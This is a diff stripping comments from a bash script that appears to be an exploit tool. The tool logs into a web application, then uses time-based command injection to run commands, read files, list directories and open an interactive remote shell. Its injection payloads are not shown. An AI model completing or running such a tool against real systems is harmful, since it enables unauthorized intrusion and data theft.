@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# Logo
 print_logo() {
     echo -e """
 ████████╗██╗███╗░░░███╗███████╗
@@ -19,7 +18,6 @@ print_logo() {
 """
 }
 
-# Run command via time-based injection
 RunCommand() {
     cmd=$1
     login_cookie=$2
@@ -33,7 +31,6 @@ RunCommand() {
     echo $elapsed_time
 }
 
-# Test target connection
 ConnectionTest() {
     target=$1
     response=$(curl -s -o /dev/null -w "%{http_code}" "$target")
@@ -44,7 +41,6 @@ ConnectionTest() {
     fi
 }
 
-# Get login session and cookie
 GetLoginSession() {
     user=$1
     password=$2
@@ -59,7 +55,6 @@ GetLoginSession() {
     fi
 }
 
-# Check if the exploit page exists
 CheckExploitPage() {
     target=$1
     cookie=$2
@@ -71,7 +66,6 @@ CheckExploitPage() {
     fi
 }
 
-# Check for vulnerabilities using time-based technique
 CheckVulnerabilities() {
     target=$1
     cookie=$2
@@ -83,7 +77,6 @@ CheckVulnerabilities() {
     fi
 }
 
-# Read a file on the target
 FileRead() {
     file_path=$1
     cookie=$2
@@ -92,7 +85,6 @@ FileRead() {
     echo "$response"
 }
 
-# List files in a directory on the target
 DirectoryList() {
     directory=$1
     cookie=$2
@@ -101,7 +93,6 @@ DirectoryList() {
     echo "$response"
 }
 
-# Interactive shell with the target
 RunRemoteShell() {
     cookie=$1
     target=$2
@@ -115,7 +106,6 @@ RunRemoteShell() {
     done
 }
 
-# Display help
 print_help() {
     echo -e """
 Usage:
@@ -143,7 +133,6 @@ Examples:
 """
 }
 
-# Main function
 main() {
     print_logo
     if [ "$#" -lt 3 ]; then
@@ -155,7 +144,6 @@ main() {
     User=$2
     Password=$3
 
-    # Get the session cookie
     LoginCookie=$(GetLoginSession "$User" "$Password" "$Target")
     if [ -z "$LoginCookie" ]; then
         echo "[-] Login failed. Please check credentials."
